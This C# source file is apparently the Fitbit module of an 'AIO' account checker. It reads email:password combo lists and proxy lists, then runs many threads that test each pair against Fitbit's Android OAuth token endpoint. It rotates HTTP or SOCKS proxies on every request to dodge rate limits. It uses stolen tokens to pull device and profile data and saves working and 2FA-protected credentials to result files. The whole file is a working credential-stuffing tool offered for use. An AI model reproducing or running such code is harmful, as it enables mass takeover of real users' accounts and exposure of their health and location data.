using JawBrute;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;
using yoboi_legend;

namespace Ebay_Checker
{
    class fitbit
    {
        [STAThread]
        public static void GMX()
        {
            Prsc.gmxapi();
            Export.Initialize();
            Console.Title = "AIO | Fitbit";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.BlueViolet);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.FloralWhite);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.BlueViolet);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.BlueViolet);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.BlueViolet);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("          > ", Color.FloralWhite);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            start();
        }
        public static void start()
        {
            Console.Clear();
            ASCII.ASCIII();
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[ClassyAIO - Fitbit] | Hits: " + Variables.hit + " | 2FA: " + Variables.free + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckAccount)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckAccount()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "*/*");

                                var res0 = httpRequest.Post("https://android-api.fitbit.com/oauth2/token", "grant_type=password&client_id=2295XJ&username=" + s[0] + "&password=" + s[1] + "&scope=activity%20heartrate%20location%20nutrition%20profile%20settings%20sleep%20social%20weight&expires_in=31536000", "application/x-www-form-urlencoded");
                                string text0 = res0.ToString();

                                var userid = Functions.LR(text0, "user_id\":\"", "\"").FirstOrDefault();
                                var token = Functions.LR(text0, "access_token\":\"", "\",\"").FirstOrDefault();
                                httpRequest.AddHeader("Pragma", "no-cache");
                                httpRequest.AddHeader("Accept", "application/json");
                                httpRequest.AddHeader("Authorization", "Bearer " + token + "");

                                var res1 = httpRequest.Get("https://android-api.fitbit.com/1/user/" + userid + "/devices.json?https://android-api.fitbit.com/1/user/" + userid + "/devices.json");
                                string text1 = res1.ToString();

                                if (text1.Contains("access_token\":\""))
                                {
                                    var DeviceName = Functions.LR(text1, "deviceVersion\":\"", "\",\"").FirstOrDefault();
                                    httpRequest.AddHeader("Pragma", "no-cache");
                                    httpRequest.AddHeader("Accept", "application/json");
                                    httpRequest.AddHeader("Authorization", "Bearer " + token + "");

                                    var res2 = httpRequest.Get("https://android-api.fitbit.com/1/user/" + userid + "/profile.json?https://android-api.fitbit.com/1/user/" + userid + "/profile.json");
                                    string text2 = res2.ToString();

                                    if (text2.Contains("[]"))
                                    {
                                        Variables.free++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [2FA] " + s[0] + ":" + s[1], Color.Yellow);
                                        Export.AsResult("/2FA", s[0] + ":" + s[1]);

                                    }
                                    else
                                    {

                                        Variables.hit++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [HIT] " + s[0] + ":" + s[1], Color.Green);
                                        Export.AsResult("/hit", s[0] + ":" + s[1]);
                                    }


                                }
                                else if (text1.Contains("success\":false"))
                                {
                                    Variables.bad++;
                                    Variables.cpm_aux++;
                                    Variables.check++;
                                    break;
                                }
                                else
                                {
                                    break;//add retry here
                                }





                                {
                                    goto stat;
                                }
                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;
                    }
                }
            }
        }
    }
}